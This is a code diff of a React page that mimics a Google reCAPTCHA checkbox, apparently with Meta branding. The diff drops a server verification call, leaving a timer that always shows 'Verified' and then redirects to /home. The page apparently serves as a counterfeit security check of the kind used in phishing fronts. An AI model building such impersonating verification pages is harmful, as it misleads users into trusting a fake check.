@@ -1,7 +1,6 @@
 import CheckMarkImage from '@/assets/images/checkmark.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ReCaptchaImage from '@/assets/images/recaptcha.png';
-import axios from 'axios';
 import { useEffect, useState } from 'react';
 
 const Index = () => {
@@ -12,27 +11,20 @@ const Index = () => {
         if (isLoading || isShowCheckMark) return;
         
         setIsLoading(true);
-        try {
-            // Gọi API verify như VPS gốc
-            const response = await axios.post('/api/verify');
-            const status = response.status;
-            
-            if (status === 200) {
-                setTimeout(() => {
-                    setIsShowCheckMark(true);
-                    setIsLoading(false);
-                }, 2000);
-            }
-        } catch {
+        
+        // Chỉ 1 setTimeout duy nhất, không có axios
+        setTimeout(() => {
+            setIsShowCheckMark(true);
             setIsLoading(false);
-        }
+        }, 1800); // Thời gian vừa đủ để thấy loading
     };
 
     useEffect(() => {
         if (isShowCheckMark) {
+            // Redirect sau khi show checkmark
             setTimeout(() => {
                 window.location.href = '/home';
-            }, 500);
+            }, 600);
         }
     }, [isShowCheckMark]);
 
@@ -52,15 +44,15 @@ const Index = () => {
                                 >
                                     <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
                                     {isLoading ? (
-                                        <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all transition-discrete'></div>
+                                        <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent'></div>
+                                    ) : isShowCheckMark ? (
+                                        <img 
+                                            src={CheckMarkImage} 
+                                            alt="Verified" 
+                                            className='h-8 w-8 rounded-[3px]'
+                                        />
                                     ) : (
-                                        <div
-                                            className={`h-8 w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
-                                            style={{
-                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage}")` : '',
-                                                backgroundPosition: '-10px -595px'
-                                            }}
-                                        ></div>
+                                        <div className='h-8 w-8 rounded-[3px] border-2 border-gray-500 bg-[#fcfcfc]'></div>
                                     )}
                                 </button>
                             </div>
